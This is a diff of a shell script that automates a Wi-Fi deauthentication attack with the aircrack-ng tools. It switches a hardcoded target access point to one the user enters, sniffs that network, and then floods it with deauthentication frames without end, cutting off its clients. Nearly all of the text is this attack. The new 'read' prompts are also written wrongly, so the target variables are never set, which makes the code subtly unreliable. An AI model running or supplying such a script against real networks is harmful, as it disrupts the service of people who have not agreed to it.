@@ -59,9 +59,21 @@ sudo airmon-ng check kill
 sleep 1
 sudo airodump-ng --band abg wlan0mon
 sleep 3
-sudo airodump-ng --bssid A8:88:1F:6A:8C:88 --channel 36 wlan0mon
+
+# Prompt the user for an MAC address
+read -p "Enter The Target BSSID: "bssid
+
+# Prompt the user for a CHANNEL number
+read -p "Enter The Target Channel: "channel
+
+# Use the variables in a standard command
+echo "Sniffing The Target $bssid On Channel $channel..."
+
+sudo airodump-ng --bssid $bssid --channel $channel wlan0mon
+
 sleep 3
-sudo aireplay-ng --deauth 0 -a A8:88:1F:6A:8C:88 wlan0mon
+sudo aireplay-ng --deauth 0 -a $bssid wlan0mon
+
 clear
 
 echo -e "\033[1;33m"
@@ -80,7 +92,7 @@ sudo airmon-ng check kill
 sleep 1
 sudo airmon-ng stop wlan0mon
 sleep 1
-sudo systemctl start NetworkManager.service
+sudo systemctl restart NetworkManager.service
 sleep 3
 sudo iw dev
 sleep 4
